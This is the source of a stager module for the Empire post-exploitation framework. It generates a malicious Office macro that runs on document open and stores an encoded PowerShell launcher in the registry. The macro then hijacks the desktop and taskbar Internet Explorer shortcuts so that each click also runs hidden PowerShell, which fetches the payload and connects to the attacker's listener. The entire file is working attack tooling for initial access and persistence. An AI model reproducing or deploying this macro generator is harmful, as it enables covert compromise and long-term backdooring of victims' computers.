from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'BackdoorLnkFileMacro',

            'Author': ['G0ldenGun'],

            'Description': ('Generates an office macro that sets up a backdoored .lnk file with an Empire .'),

            'Comments': [
                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'LNKPath' : {
                'Description'   :   'DOESNT DO ANYTHING YET AS WE ARE HARDCODED FOR IE, PUT ANYTHING IN HERE -- Full path to the .LNK to backdoor.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RegPath' : {
                'Description'   :   'Registry location to store the script code. Last element is the key name.',
                'Required'      :   True,
                'Value'         :   'HKCU:\Software\Microsoft\Windows\debug'
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/macro'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
 	    'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }

        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
	lnkPath = self.options['LNKPath']['Value']
	regPath = self.options['RegPath']['Value']
	regParts = regPath.split("\\")
	path = "\\".join(regParts[0:len(regParts)-1])
	name = regParts[len(regParts)-1]

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
	launcher = launcher.split(" ")[-1]

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            chunks = list(helpers.chunks(launcher, 50))
            payload = "\tDim encRP As String\n"
            payload += "\tencRP = \"" + str(chunks[0]) + "\"\n"
            for chunk in chunks[1:]:
                payload += "\tencRP = encRP + \"" + str(chunk) + "\"\n"

            macro = "Sub Auto_Open()\n"
            macro += "\tOffice\n"
            macro += "End Sub\n\n"


            macro += "Public Function Office() As Variant\n"
            macro += payload
	
	    macro += "Dim i_RegKey As String, i_Value As String, i_Type as String\n"
	    macro += "Dim myWS As Object, lnk as Object\n"
	    macro += "i_Type = \"REG_SZ\"\n"
	    macro += "Set myWS = CreateObject(\"Wscript.Shell\")\n"
#set up first link - creates / replaces iexplore.lnk (display name iexplore) on users desktop if it sees it
	    macro += "Set lnk = myWS.CreateShortcut(myWS.SPecialFolders(\"desktop\") & \"\\iexplore.lnk\")\n"
	    
	    launchString = "[System.Diagnostics.Process]::Start(\"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp " + path+" " + name + ")." + name+")))\n"

	    macro += "lnk.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"\n"


	    encLaunch = helpers.enc_powershell(launchString)
	    macro += "lnk.arguments = \"-w hidden -nop -enc " + encLaunch + "\"\n"
	    macro += "lnk.IconLocation = \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\"\n"
	    macro += "lnk.save\n"


#2nd link here -- will overwite ie if it finds a file named 'Internet Explorer' in the taskbar menu
	    macro += "Set lnk = myWS.CreateShortcut(Environ(\"AppData\") & \"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Internet Explorer.lnk\")\n"
	    macro += "lnk.targetpath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"\n"
	    macro += "lnk.arguments = \"-w hidden -nop -enc " + encLaunch + "\"\n"
	    macro += "lnk.IconLocation = \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\"\n"
	    macro += "lnk.save\n"


#setting reg value
	    regPath = regPath.translate(None, ':')
	    macro += "i_Regkey = \"" + regPath +"\"\n"
	    macro += "myWS.RegWrite i_RegKey, encRP, i_Type\n" 	    
            

            macro += "End Function\n"

            return macro
